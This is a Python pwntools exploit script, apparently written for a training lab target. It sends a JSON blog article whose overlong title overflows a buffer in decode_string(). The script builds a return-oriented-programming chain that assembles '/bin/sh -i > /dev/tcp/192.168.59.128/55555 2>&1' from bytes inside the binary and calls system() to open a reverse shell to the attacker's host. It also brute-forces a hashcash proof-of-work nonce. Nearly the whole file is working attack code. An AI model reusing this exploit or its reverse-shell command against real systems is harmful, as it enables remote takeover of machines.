

import json
import hmac
import hashlib
from pwn import *

context.endianness = 'little'
context.word_size = 32
context.sign = False
#context.log_level = logging.DEBUG
conn = remote('192.168.59.131', 20003)

# receive the token which acts as an authentication method for subsequent requests
token = conn.recvline()
token = token[1:-2]
log.info('Token: ' + token.decode('ascii') + ' (' + str(len(token)) + ' Bytes)')

# A reverse shell over netcat will be created
# https://oscp.securable.nl/gaining-access
# https://medium.com/@dharma.unik/neutered-netcat-no-prob-1ac188449d1 
attacker_ip = "192.168.59.128"
attacker_port = "55555"

binary_start__addr = 0x8048000  # Start address of the binary
gContents__addr = 0x0804bdf4

# Unused space in .bss section.
# Here we will store the address of system and the string command to be executed
free_bss__addr = 0x0804be20       
system_ptr__addr = free_bss__addr + 0x00    # Here we will store the address of system
cmd__addr = free_bss__addr+0x4              # Here we will store the argument of system (command to be executed)

plt__memcpy = 0x08048e60        # function stub in .plt
got_plt__srand = 0x0804bcd4     # GOT offset in .got.plt

gadget0 = 0x0804964d    # pop ebx; pop esi; pop edi; ret; 
gadget1 = 0x08048bf0    # pop ebx; ret;
gadget2 = 0x08049b4f    # pop eax; add esp, 0x5c; ret;
gadget3 = 0x080493fe    # add dword ptr [ebx + 0x5d5b04c4], eax; ret;
gadget4 = 0x0804a933    # call dword ptr [ebx];

alpha = 0x5d5b04c4  # present in gadget3
gamma = 0x00009b60  # == &system - &srand

def encode32(x):
    """
    Take a 32bit number value and return its unicode representation in order to be sent as text
    """
    while x < 0:
        x = x + 2**32    # Convert 2's complement negative numbers to unsigned
    assert((x >> 32) == 0) # Must be a 32bit quantity
    x = pack(x, 32, 'little', False)    # Convert to little endian

    s = ""
    for b in x:
        s += '{:02x}'.format(b) # Convert little endian, unsigned, 32bit value to string number in hex base
    assert(len(s) == 8)
    return "\\u" + s[0:4] + "\\u" + s[4:]   #e.g. \u4e4d\u4e4f represents input number x == 4f4e4d4e

def memcpy_chain(dest, src, n, ret_addr):
    """
    Invokes memcpy(dest,src,n) in the target program and then sets $eip to ret_addr
    Multiple calls can be chained like:
    memcpy_chain(dest1, src1, n1, plt__memcpy)
    memcpy_chain(dest2, src2, n2, plt__memcpy)
    memcpy_chain(dest3, src3, n3, ret_addr)
    """
    return (
        (
            encode32(gadget0)   +   # will cleanup stack after memcpy
            encode32(dest)      +
            encode32(src)       +
            encode32(n)
        )   +
        (
            encode32(ret_addr)
        )
    )

# Store in address cmd__addr the string: "/bin/sh -i > /dev/tcp/192.168.59.128/55555 2>&1 0<&1\x00"
#/  bin    /  sh      -i      >     /  dev    /  tcp    /  192    .  168    .  59   .  128    /  55555         2  >  &  1     0  <  &  1
#2f 62696e 2f 7368 20 2d69 20 3e 20 2f 646576 2f 746370 2f 313932 2e 313638 2e 3539 2e 313238 2f 3535353535 20 32 3e 26 31 20 30 3c 26 31

assert(attacker_ip == "192.168.59.128") # present within offset_ar
assert(attacker_port == "55555") # present within offset_ar
offset_arr = [
    (0x00000134, len("/")), 
    (0x00000796, len("bin")), 
    (0x00000134, len("/")), 
    (0x000006fa, len("sh")), 
    (0x0000002a, len(" ")), # <space> 
    (0x0000013b, len("-")),
    (0x00000136, len("i")), 
    (0x0000002a, len(" ")), # <space> 
    (0x00001055, len(">")), 
    (0x0000002a, len(" ")), # <space> 
    (0x00000134, len("/")), 
    (0x000000f7, len("d")), 
    (0x00000626, len("e")), 
    (0x00000623, len("v")), 
    (0x00000134, len("/")), 
    (0x000025f8, len("tcp")), 
    (0x00000134, len("/")), 
    (0x00000414, len("1")), 
    (0x00000bc1, len("9")), 
    (0x00000145, len("2")), 
    (0x00000141, len(".")), 
    (0x00000414, len("1")), 
    (0x000006de, len("6")), 
    (0x000001c0, len("8")), 
    (0x00000141, len(".")), 
    (0x00000021, len("5")), 
    (0x00000bc1, len("9")), 
    (0x00000141, len(".")), 
    (0x00000414, len("1")), 
    (0x00000145, len("2")), 
    (0x000001c0, len("8")), 
    (0x00000134, len("/")), 
    (0x0000017b, len("5")), 
    (0x0000017b, len("5")), 
    (0x0000017b, len("5")), 
    (0x0000017b, len("5")), 
    (0x0000017b, len("5")), 
    (0x0000002a, len(" ")), # <space> 
    (0x00000145, len("2")), 
    (0x00001055, len(">")), 
    (0x00000264, len("&")), 
    (0x00000414, len("1")), 
    (0x0000002a, len(" ")), # <space> 
    (0x00000610, len("0")), 
    (0x000004b4, len("<")), 
    (0x00000264, len("&")), 
    (0x00000414, len("1")), 
    (0x00000007, len("\x00")), 
]

rop_chain = encode32(plt__memcpy)

idx = 0
for offset, n in offset_arr:
    rop_chain += memcpy_chain(cmd__addr+idx, binary_start__addr+offset, n, plt__memcpy)
    idx += n
rop_chain += memcpy_chain(system_ptr__addr, got_plt__srand, 0x4, gadget1)

rop_chain += (
    (
        encode32(system_ptr__addr - alpha)   +   # == 0xaaa9b930
        encode32(gadget2)
    )   +
    (
        encode32(gamma)     +
        'A'*0x5c            +
        encode32(gadget3)
    )   +
    (
        encode32(gadget1)
    )   +
    (
        encode32(system_ptr__addr)       +
        encode32(gadget4)
    )   +
    (
        encode32(cmd__addr) # "/bin/sh -i > /dev/tcp/192.168.59.128/55555 2>&1 0<&1"
    )
)


# Create a blog article that will result in a buffer overflow, taking control of return address of decode_string()
# The title buffer is used to perform the buffer overflow.
blog_article = {
    "tags"      :   ["#democracy", "#socialism"],
    "contents"  :   "\\/bin\\/sh\x00",  # escaping is used for the JSON parsing
    "serverip"  :   "127.0.0.1"
}
title_max_len = 128 # Bytes
title = "A"*(title_max_len-1) + '\\u1234'   # This will write 129 Bytes in dest (\\u1234 (6 Bytes) in src will result in 2 Bytes written in dest)
title += "B"*31  # padding until we reach return address
title += rop_chain  # overwrites return address and a lot of stack
title += "\x00" # will break the while() loop in decode_string() and won't be copied in dest
blog_article["title"] = title 
blog_article = bytearray(json.dumps(blog_article), 'utf-8')


# hashcash algorithm
log.info('Starting hashcash')
nonce = randint(0, 0xffffffff)  # [0, 2^32-1]
condition = False
while not condition:
    data = token + b'\n'  # We add a new line since the token starts with "//" indicating that the first line is a comment during the JSON parsing
    data += blog_article + b'\x00' # NULL Bytes so that the JSON parsing won't continue further to the nonce used for the hashcash algorithm

    # hashcash algorithm satisfaction
    data += pack(nonce, 32, 'little', False)
    digest = hmac.new(token, data, hashlib.sha1).digest()
    condition = (digest[0] | digest[1]) == 0x00 # The first 16 bits must be zero.
    if not condition:
        nonce = (nonce+1) & 0xffffffff  # Always trim to 32 bits

log.info('hashcash finished with nonce: ' + hex(nonce))

conn.send(data)
log.info('Payload sent')

conn.close()
